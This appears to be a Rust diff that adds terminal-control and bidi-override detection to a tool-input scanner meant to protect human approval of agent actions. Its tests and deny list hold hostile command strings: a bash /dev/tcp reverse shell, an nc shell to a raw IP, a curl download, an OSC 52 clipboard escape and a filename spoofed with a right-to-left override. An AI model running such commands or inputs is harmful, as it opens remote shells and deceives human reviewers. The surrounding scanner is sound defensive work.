@@ -287,6 +287,11 @@ fn tripwire(s: &str) -> Option<&'static str> {
     ];
     const NET_TOOLS: &[&str] = &["nc", "ncat", "netcat", "telnet", "socat"];
 
+    // Terminal escapes, C1 controls and bidi overrides in a tool input could spoof what the
+    // human approves (CONTRACT §15.4, A165); tabs, CR and LF stay legitimate (file content).
+    if s.chars().any(|c| matches!(c, '\u{1B}' | '\u{7F}'..='\u{9F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}')) {
+        return Some("terminal-control");
+    }
     let piped = s.match_indices('|').any(|(i, _)| {
         let rest = s.get(i.saturating_add(1)..).unwrap_or_default();
         if rest.starts_with('|') || s.get(..i).is_some_and(|b| b.ends_with('|')) {
@@ -368,6 +373,8 @@ mod tests {
             ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "raw-ip-egress"),
             ("curl http://45.9.1.2:8080/x -o y", "raw-ip-egress"),
             ("nc 45.9.1.2 4444 -e /bin/sh", "raw-ip-egress"),
+            ("echo \u{1b}]52;c;ZXZpbA==\u{7} ok", "terminal-control"),
+            ("ls # \u{202e}fdp.exe", "terminal-control"),
         ];
         for (s, rule) in hits {
             assert_eq!(scan_text(s), Some(rule), "{s}");
